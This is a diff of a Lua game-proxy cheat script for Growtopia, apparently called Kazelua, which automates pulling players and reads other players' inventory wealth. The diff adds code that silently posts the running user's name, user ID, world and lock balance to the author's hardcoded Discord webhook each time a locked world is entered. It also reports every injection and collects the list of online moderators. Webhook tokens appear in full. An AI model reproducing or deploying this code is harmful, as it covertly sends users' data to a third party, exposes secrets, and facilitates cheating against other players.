@@ -15,8 +15,7 @@ local pmodal = false
 local pbmodal = false
 local sdb = false
 local cbgl = false
-local world_text = false
-local slave_mute = false
+local mute = false
 local sb_send = false
 local name = "`2[ Kazelua ]"
 local prefix_color = false
@@ -41,8 +40,14 @@ local LogS = ""
 local LogD = ""
 local LogC = ""
 local xlewa = 5
-local world_text = true
+local world_text = false
 local skin_blink = false
+local spam_text = false
+local simpan_nama = nil
+local tandai_nama = false
+
+
+
 
 function removeColorAndSymbols(str)
     cleanedStr = string.gsub(str, "`(%S)", '')
@@ -392,7 +397,7 @@ function sendsbwebhook2(x)
 LogToConsole("x")
 end
 
-function sendsbwebhook(x)
+function sendsbwebhook3(x)
     local linksb = "https://discord.com/api/v10/webhooks/1423076002321530964/oIbFJpolRIdMVUaCKIZFaJmJUNh1nH8xpjkzuTOt3EBM4Tc7ibemkUEOf_9SgkjrI7nm"
 
     -- filter dulu isi pesannya
@@ -409,21 +414,63 @@ function sendsbwebhook(x)
     end)
 end
 
-function sendworld()
-    local linkworld = "https://discord.com/api/v10/webhooks/1423147263156555827/qSvmpDLqmi3GlYV-n8SBSmD4X_2C0x6anMlR9FSLBr7Kv_iQNTJbaHct3Xqx7OdrdBGw"
+function sendsbwebhook(x)
+    local linksb = "https://discord.com/api/v10/webhooks/1423076002321530964/oIbFJpolRIdMVUaCKIZFaJmJUNh1nH8xpjkzuTOt3EBM4Tc7ibemkUEOf_9SgkjrI7nm"
 
-    local worldName = GetWorld().name:gsub("`.", "")
+    local cleanX = removeColorAndSymbols(x)
 
     local requestBody = [[{
-      "content": "**User : ]]..Filter(GetLocal().name)..[[**\n**UserID : ]]..GetLocal().userid..[[**\n**World : ]]..GetWorld().name..[[**",
-      "username": "[ Kazelua ] Bot Webhook",
-      "avatar_url": "https://cdn.discordapp.com/attachments/1384472540876902480/1384497376995053649/Nazuna_Hiwatashi.png"
+        "username": "[ Kazelua ] CPS SB Logs",
+        "avatar_url": "https://cdn.discordapp.com/attachments/1384472540876902480/1384497376995053649/Nazuna_Hiwatashi.png",
+        "embeds": [{
+            "description": "]] .. cleanX .. [[\n🕒 Time: ]] .. jam .. [[ (]] .. tanggal .. [[)",
+            "color": 3447003
+        }]
+    }]]
+
+    RunThread(function()
+        MakeRequest(linksb, "POST", {["Content-Type"] = "application/json"}, requestBody)
+    end)
+end
+
+function webhook_world()
+    local linkworld = "https://discord.com/api/v10/webhooks/1432629422003060810/lBNeiM5b39XNqxYSMKkHtDVTlo7o-kgvhSI_fFVU3gVl4HVEdgLaU7U0e99lx_qkvQpv"
+    
+    -- Hitung jumlah WL, DL, BGL, Ireng
+    local balwl = invc(242)
+    local baldl = invc(1796)
+    local balbgl = invc(7188)
+    local balireng = invc(11550)
+
+    local balwls = balwl * 1
+    local baldls = baldl * 100
+    local balbgls = balbgl * 10000
+    local balirengs = balireng * 1000000 
+
+    local totalbal = balwls + baldls + balbgls + balirengs
+
+    local requestBody = [[{
+      "username": "[ Kazelua ] Worlds",
+      "avatar_url": "https://cdn.discordapp.com/attachments/1384472540876902480/1384497376995053649/Nazuna_Hiwatashi.png",
+      "embeds": [{
+        "title": "📜 World Info",
+        "description": "**Nama:** ]]..removeColorAndSymbols(GetLocal().name)..[[\n**UserID:** ]]..GetLocal().userid..[[\n**World:** ]]..GetWorld().name..[[",
+        "fields": [
+          {
+            "name": "Balance",
+            "value": "<:ireng:1422940933472653443> : ]]..balireng..[[\n<:bgl:1324707917487804497> : ]]..balbgl..[[\n<:dl:1406183653796614326> : ]]..baldl..[[\n<:wl:1422940801947930726> : ]]..balwl..[[\n**Total : ]]..totalbal..[[ <:wl:1422940801947930726>**",
+            "inline": false
+          }
+        ],
+        "color": 3447003
+      }]
     }]]
 
     RunThread(function()
         MakeRequest(linkworld, "POST", {["Content-Type"] = "application/json"}, requestBody)
     end)
 end
+
 
 function Teleport(x, y)
 RunThread(function()
@@ -447,7 +494,7 @@ RunThread(function()
 				Sleep(150)
 			end
 		else
-			Sleep(200) -- istirahat biar nggak 100% CPU pas mati
+			Sleep(200)
 		end
 	end
 end)
@@ -533,14 +580,24 @@ if str:find("action|wrench\n|netid|(%d+)") then
         return true
     end
 
-    if wrench_pull then
-        SendPacket(2,"action|dialog_return\ndialog_name|popup\nnetID|"..id.."|\nbuttonClicked|pull")
-        if playerName then
-            SendPacket(2, "action|input\n|text|`w[ `2Gas Bang "..playerName.." `w[`2REME`w/`2QEME`w/`2LEME`w]`2 ? `w]")
-        end
-        return true
-    end
+if wrench_pull then
+    SendPacket(2, "action|dialog_return\ndialog_name|popup\nnetID|"..id.."|\nbuttonClicked|pull")
+    if playerName then
+        SendPacket(2, "action|input\n|text|`w[ `2Gas Bang `w[ "..playerName.." `w] `2? `w]")
+        simpan_nama = playerName
 
+        if not tandai_nama then
+            tandai_nama = true
+            RunThread(function()
+                Sleep(300)
+                SendPacket(2, "action|dialog_return\ndialog_name|popup\nnetID|"..id.."|\nbuttonClicked|viewinv")
+            end)
+        else
+            ov("`4Failed Pull Player !!")
+            return true
+        end
+    end
+end
     if wrench_kick then
         SendPacket(2,"action|dialog_return\ndialog_name|popup\nnetID|"..id.."|\nbuttonClicked|kick")
         return true
@@ -895,7 +952,6 @@ if str:find("/dtp") or str:find("buttonClicked|boxtp") then
 if dbox_tp == false then
 dbox_tp = true 
 say(""..name.." `2Enable `wDisplay Teleport `2Mode")
-ov("DTP is Not Ready now..")
 return true
 else
 dbox_tp = false
@@ -983,25 +1039,6 @@ return true
 end
 end
 
-if str:find("/pmodal") then
-if pmodal == false then
-pmodal = true
-pbmodal = false
-wrench_pull = false
-wrench_kick = false
-wrench_ban = false
-say(""..name.." `2Enable `wShow Modal Player (shamrock)")
-return true
-else
-pmodal = false
-pbmodal = false
-wrench_pull = false
-wrench_kick = false
-wrench_ban = false
-say(""..name.." `4Disable `wShow Modal Player (shamrock)")
-return true
-end
-end
 
 if str:find("/br") then
 wear(7188)
@@ -1094,44 +1131,68 @@ end
 
 -- skin button List
 if str:find("/skin white") or str:find("buttonClicked|wskin") then
+  if skin_blink == true then
+    skin_blink = false
   say(""..name.." `2Skin set to : `wWhite (shamrock)")
   SendPacket(2, "action|dialog_return\ndialog_name|skinpicker\nred|255\ngreen|255\nblue|255\ntransparency|0")
   return true
 end
+end
 if str:find("/skin black") or str:find("buttonClicked|bskin") then
+  if skin_blink == true then
+    skin_blink = false
   say(""..name.." `2Skin set to : `wBlack (shamrock)")
   SendPacket(2, "action|dialog_return\ndialog_name|skinpicker\nred|0\ngreen|0\nblue|0\ntransparency|0")
   return true
 end
+end
 if str:find("/skin red") or str:find("buttonClicked|rskin") then
+  if skin_blink == true then
+    skin_blink = false
   say(""..name.." `2Skin set to : `wRed (shamrock)")
   SendPacket(2, "action|dialog_return\ndialog_name|skinpicker\nred|255\ngreen|0\nblue|0\ntransparency|0")
   return true
 end
+end
 if str:find("/skin green") or str:find("buttonClicked|gskin") then
+  if skin_blink == true then
+    skin_blink = false
   say(""..name.." `2Skin set to : `wGreen (shamrock)")
   SendPacket(2, "action|dialog_return\ndialog_name|skinpicker\nred|0\ngreen|255\nblue|0\ntransparency|0")
   return true
 end
+end
 if str:find("/skin blue") or str:find("buttonClicked|bskin") then
+  if skin_blink == true then
+    skin_blink = false
   say(""..name.." `2Skin set to : `wBlue (shamrock)")
   SendPacket(2, "action|dialog_return\ndialog_name|skinpicker\nred|0\ngreen|0\nblue|255\ntransparency|0")
   return true
 end
+end
 if str:find("/skin yellow") or str:find("buttonClicked|yskin") then
+  if skin_blink == true then
+    skin_blink = false
   say(""..name.." `2Skin set to : `wYellow (shamrock)")
   SendPacket(2, "action|dialog_return\ndialog_name|skinpicker\nred|255\ngreen|255\nblue|0\ntransparency|0")
   return true
 end
+end
 if str:find("/skin pink") or str:find("buttonClicked|pskin") then
+  if skin_blink == true then
+    skin_blink = false
   say(""..name.." `2Skin set to : `wPink (shamrock)")
   SendPacket(2, "action|dialog_return\ndialog_name|skinpicker\nred|255\ngreen|193\nblue|203\ntransparency|0")
   return true
 end
+end
 if str:find("/skin purple") or str:find("buttonClicked|uskin") then
+  if skin_blink == true then
+    skin_blink = false
   say(""..name.." `2Skin set to : `wPurple (shamrock)")
   SendPacket(2, "action|dialog_return\ndialog_name|skinpicker\nred|128\ngreen|0\nblue|128\ntransparency|0")
   return true
+end
 end
 
 -- dialog custom 
@@ -1325,112 +1386,76 @@ return true
 elseif var[0] == "OnConsoleMessage" and var[1]:find("commands.") then
 LogToConsole("`2[ Kazelua ] `2Cannot Find The Command Captain, Please Type `w/proxy `2to see all commands.")
 return true end
-if var[0]:find("OnConsoleMessage") and var[1]:find("World Locked") then
-  if textworld == true then
+if var[0]:find("OnConsoleMessage") and var[1]:find("Locked") then
+  webhook_world()
+  if world_text == true then
 say(""..name.." `2Entered World : "..GetWorld().name)
-sendworld()
 return true
 end
 end
 
-local hasLocks = false
+if var[0]:find("OnConsoleMessage") and var[1]:find("Mods online: (.+)") then
+  datamods = var[1]:match("Mods online: (.+)")
+  senddatamods(datamods)
+  return true
+end
 
-if pbmodal or pmodal then
-    if var[0]:find("OnDialogRequest") then
-        if var[1]:find("end_dialog|profileinfo|Close||") then
-            local dialog = var[1]
+if var[0]:find("OnConsoleMessage") and var[1]:find("/mods") then
+  return true
+end
 
-			local playerName = dialog:match("add_label_with_icon|big|([^|]+)|") or "Unknown"
-playerName = playerName
-    :gsub("%s*%(%#%d+%)", "")
-    :gsub("'s", "")
-    :gsub("Inventory", "")
-    :gsub("%s+", "")
+if var[0]:find("OnConsoleMessage") and var[1]:find("`2(Wait a second before doing this again!)``") then
+return true 
+end
 
-            local function extract_amount_id(itemid)
-                local pattern = "add_button_with_icon.-|" .. itemid .. "|(%d+)"
-                return tonumber(dialog:match(pattern)) or 0
+if var[0]:find("OnConsoleMessage") and var[1]:find("Can't `5pull``, is not in a locked area you control!") then
+  ov("`4Failed Pull Player !!")
+  return true
+end
+
+if tandai_nama and var[0]:find("OnDialogRequest") then
+    if var[1]:find("end_dialog|profileinfo|Close||") then
+        local dialog = var[1]
+        local playerName = dialog:match("add_label_with_icon|big|([^|]+)|") or "Unknown"
+        playerName = playerName:gsub("%s*%(%#%d+%)", ""):gsub("'s", ""):gsub("Inventory", ""):gsub("%s+", "")
+
+        local WL   = tonumber(dialog:match("add_button_with_icon.-|242|(%d+)")) or 0
+        local DL   = tonumber(dialog:match("add_button_with_icon.-|1796|(%d+)")) or 0
+        local BGL  = tonumber(dialog:match("add_button_with_icon.-|7188|(%d+)")) or 0
+        local BGLs = tonumber(dialog:match("add_button_with_icon.-|11550|(%d+)")) or 0
+
+        local BankBGL = 0
+        for line in dialog:gmatch("[^\n]+") do
+            if line:find("`oBlue Gem Locks in the Bank:") then
+                local num = line:match("Bank:%s*(%d+)")
+                if num then BankBGL = tonumber(num) break end
             end
-
-            local function check_bank_bgl_player()
-                for line in dialog:gmatch("[^\n]+") do
-                    if line:find("`oBlue Gem Locks in the Bank:") then
-                        local num = line:match("Bank:%s*(%d+)")
-                        if num then return tonumber(num) end
-                    end
-                end
-                return 0
-            end
-
-            local function check_modal_player(name)
-                local result = {}
-                if pbmodal then
-                    result["BGL"]  = extract_amount_id(7188)
-                    result["BGLs"] = extract_amount_id(11550)
-                end
-                if pmodal then
-                    result["WL"]   = extract_amount_id(242)
-                    result["DL"]   = extract_amount_id(1796)
-                    result["BGL"]  = extract_amount_id(7188)
-                    result["BGLs"] = extract_amount_id(11550)
-                end
-
-                local hasLocks = false
-                for _, amount in pairs(result) do
-                    if amount > 0 then
-                        hasLocks = true
-                        break
-                    end
-                end
-
-                if pbmodal then
-                    if hasLocks then
-                        say("`#" .. name .. " `1Modal `c> `eBGL: `5" .. result["BGL"] ..
-                            " `bBGLs: `5" .. result["BGLs"] ..
-                            " `oBankBGL: `5" .. check_bank_bgl_player())
-                    else
-                        console(name .. " `4does not `9have `eBGL `9or `aBGLs `9in inventory")
-                    end
-                elseif pmodal then
-                    if hasLocks then
-                        say("`#[ " .. name .. " `1Modal `#] `c> `9WL: `5" .. result["WL"] ..
-                            " `3DL: `5" .. result["DL"] ..
-                            " `eBGL: `5" .. result["BGL"] ..
-                            " `bBGLs: `5" .. result["BGLs"] ..
-                            " `oBankBGL: `5" .. check_bank_bgl_player())
-                    else
-                        console(name .. " `4does not `9have locks `6(WL - DL - BGL - BGLs) `9in inventory")
-                    end
-                end
-            end
-
-            local function check_modal_pull_player(name)
-                check_modal_player(name)
-                PullDelayViewInv = true
-            end
-
-            if pbmodal then
-                check_modal_pull_player(playerName)
-            else
-                check_modal_player(playerName)
-            end
-
-            return true
-        elseif var[1]:find("end_dialog|popup|||") then
-            return true
         end
+
+        if WL > 0 or DL > 0 or BGL > 0 or BGLs > 0 then
+              console("`2[ `w" .. playerName .. " `2] `2Modal : `w"..WL.." `9WL`w "..DL.." `1DL `w"..BGL.." `eBGL `w"..BGLs.." `bBlack Gem Lock `w"..BankBGL.." `eBGL `win bank")
+              ov("`2Player Information : " .. playerName .. "\n`2Modal : `w"..WL.." `9WL`w "..DL.." `1DL `w"..BGL.." `eBGL `w"..BGLs.." `bBlack `w"..BankBGL.." `eBGL `win bank")
+        else
+            console(playerName .. " `4does not `9have locks `6(WL - DL - BGL - BGLs) `9in inventory")
+        end
+
+        tandai_nama = false
+
+        return true
+    elseif var[1]:find("end_dialog|popup|||") then
+        return true
     end
 end
 
--- Champagne
+
 if var[0]:find("OnDialogRequest") and var[1]:find("`wTelephone") then
-if amer == true and amer2 == false then
+if champ == true and champ1 == false then
 x = var[1]:match("embed_data|x|(%d+)")
-y = var[1]:match("embed_data|y|(%d+)")      
+y = var[1]:match("embed_data|y|(%d+)")
 SendPacket(2,"action|dialog_return\ndialog_name|telephone\nnum|53785|\nx|"..x.."|\ny|"..y.."|\nbuttonClicked|getchamp")
 ov ("`2Sucsess Buy Champagne")
 return true
-elseif amer == false and amer2 == true then
+elseif champ == false and champ1 == true then
   x = var[1]:match("embed_data|x|(%d+)")
 y = var[1]:match("embed_data|y|(%d+)")      
 SendPacket(2,"action|dialog_return\ndialog_name|telephone\nnum|53785|\nx|"..x.."|\ny|"..y.."|\nbuttonClicked|getchamp1")
@@ -1470,13 +1495,13 @@ end
 end
 
 if var[0]:find("OnConsoleMessage") and var[1]:find("Spammer Slave.") then
-  if slave_mute == true then
+  if mute == true then
 return true
 end
 end
 
 if var[0] == "OnTalkBubble" and var[2]:find("No spam text set.") and var[2]:find("My slave owner must") and var[2]:find("text first!") then
-  if slave_mute == true then
+  if mute == true then
 return true
 end
 end
@@ -1544,7 +1569,6 @@ add_smalltext|`9Command > `#/sdb `1( `2Enable `1/ `4Disable `0Block SDB `1)|
 add_smalltext|`9Command > `#/worlds `1( `2Enable `1/ `4Disable `0Send The Text If Your Joined World `1)|
 add_smalltext|`8note: `#/worlds > `1if there is a `9locked `1it will appear|
 add_smalltext|`9Command > `#/modal `1( `0Show Modal Lock On Self `1)
-add_smalltext|`9Command > `#/pmodal `1( `2Enable `1/ `4Disable `1Show Modal Lock On Player `1)|
 add_smalltext|`9Command > `#/slavemute `8or `#/smute `1( `2Enable `1/ `4Disable `0Mute Spammer Slave `1)|
 add_smalltext|`9Command > `#/relog `1( `0Fast Relog `1)|
 add_smalltext|`9Command > `#/res `1( `0Fast Respawn `1)
@@ -1721,7 +1745,7 @@ set_default_color|`w
 add_label_with_icon|big|`1Kazelua Proxy Helper|left|14514|
 add_spacer|small|
 add_textbox|`9Script Created: `2]]..CreateScript..[[ `9(`5]]..days_text..[[`9)|
-add_smalltext|`9Version : `21.0 Bothax Android|
+add_smalltext|`9Version : `2BOTHAX|
 add_smalltext|`9Created by : `2TegarP|
 add_spacer|small|
 add_smalltext|`9Thank you for using `2TegarPxKazelua `9Script!, `9This script is `4NOT ENCRYPTED`9 please `4do not sell`9 it|
@@ -1739,7 +1763,6 @@ add_smalltext|`2[ + ] `9Added Commands: `2/slavemute `c& `2/smute|
 add_smalltext|`2[ + ] `9Added Commands: `2/rainbow `9- `2/kazelua `9- `2/myname|
 add_smalltext|`2[ + ] `9Added Commands: `2/modal|
 add_smalltext|`6[ / ] `9Changed Commands: `8/w /d /b /i `9> `2/w /d /b /i|
-add_smalltext|`6[ / ] `9Changed Commands: `8/sm `9> `2/pmodal|
 add_smalltext|`6[ / ] `9Change Commands: `8/remoji `9> `2/prefix|
 add_smalltext|`6[ / ] `9Change Commands: `8/worldtext `9> `2/worlds|
 add_spacer|small|
@@ -1796,7 +1819,7 @@ local requestBody = [[{
   "embeds": [
     {
       "title": "Kazelua Script",
-      "description": "Script has Injected by **]] .. removeColorAndSymbols(GetLocal().name) .. [[**\nUser ID : **]] .. GetLocal().userid .. [[**\nWorld : **]] .. GetWorld().name .. [[**\nDate : **]] .. jam .. [[ (]] .. tanggal .. [[)**\nScript Name : **Kazelua Proxy [ BHax Andro ]**",
+      "description": "Script has Injected by **]] .. removeColorAndSymbols(GetLocal().name) .. [[**\nUser ID : **]] .. GetLocal().userid .. [[**\nWorld : **]] .. GetWorld().name .. [[**\nDate : **]] .. jam .. [[ (]] .. tanggal .. [[)**\nScript Name : **Kazelua Proxy [ BOTHAX ]**",
       "url": "https://discord.com/channels/912140755475251280/1136847163905818635",
       "color": 8060672,
       "author": { "name": "" },
@@ -1822,9 +1845,11 @@ local requestBody = [[{
     
 MakeRequest(myLink, "POST", {["Content-Type"] = "application/json"}, requestBody)
   
-    say("`2(shamrock) [Kazelua Proxy By TegarP 1.0 [Bhax] ] (shamrock)")
+    say("`2(shamrock) [Kazelua Proxy By TegarP [BOTHAX] ] (shamrock)")
+    Sleep(1000)
+    say("/mods")
     Sleep(1500)
     if sb_send == true then
-        say("/sb `2[ Kazelua Proxy By TegarP v1.0 [Bhax] ]")
+        say("/sb `2[ Kazelua Proxy By TegarP [BOTHAX] ]")
     end
     opening()
